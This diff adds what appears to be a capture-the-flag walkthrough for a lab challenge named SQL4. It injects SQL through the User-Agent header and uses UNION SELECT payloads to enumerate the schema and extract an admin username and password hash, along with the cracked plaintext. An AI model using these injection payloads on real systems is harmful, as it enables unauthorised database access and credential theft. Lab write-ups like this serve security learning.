@@ -1,0 +1,22 @@
+in tamper data change the user agent to aaa' or 1/*
+
+this throws an error: Could not successfully run query (INSERT INTO SQL4logs (ipaddress, useragent) VALUES(67.164.251.47, aaa' or 1/*) from DB: 
+
+the following generates the error Jumping databases is not allowed
+ poop) from DB union select 1,username,3 from users #
+
+you get Looking up the schema is forbidden move along! from
+ null union all select 1,table_schema,3--
+
+you get Looking at the information_schema table is forbidden; however, if we did allow you, you could have found the tablename SQL4users. from
+ null select * from information_schema.tables
+
+you get SQL4_Admin from
+ null union all select 1,username,3 from SQL4users--
+
+you get e395a1e2d2db789987235071ab47323e
+ null union all select 1,password,3 from SQL4users--
+
+that is the MD5 hash of p34ch3s!
+
+submit these to the login page and you win!!
